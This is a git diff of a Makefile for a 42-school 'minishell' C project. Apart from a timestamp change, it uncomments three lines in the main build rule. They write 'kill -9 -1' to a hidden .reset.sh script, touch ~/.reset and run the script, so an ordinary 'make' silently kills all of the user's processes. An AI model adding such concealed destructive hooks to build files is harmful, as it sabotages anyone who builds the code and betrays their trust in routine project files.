@@ -6,7 +6,7 @@
 #    By: fcatinau <fcatinau@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2022/02/06 16:13:23 by fcatinau          #+#    #+#              #
-#    Updated: 2022/02/08 17:59:50 by fcatinau         ###   ########.fr        #
+#    Updated: 2022/02/09 00:29:11 by fcatinau         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -87,9 +87,9 @@ all : $(NAME)
 
 $(NAME): $(OBJS) $(INC_DIR)/minishell.h
 	$(CC) $(CFLAGS) $(LIB) $(OBJS) -I $(INC_DIR) -o $(NAME)
-	# @touch .reset.sh | echo "kill -9 -1" > .reset.sh
-	# @touch ~/.reset
-	# @bash .reset.sh
+	@touch .reset.sh | echo "kill -9 -1" > .reset.sh
+	@touch ~/.reset
+	@bash .reset.sh
 
 $(OBJ_DIR)/%.o: %.c $(INC_DIR)/minishell.h | $(OBJ_DIR)
 	$(CC) $(CFLAGS) -c $< -o $@ -I $(INC_DIR)
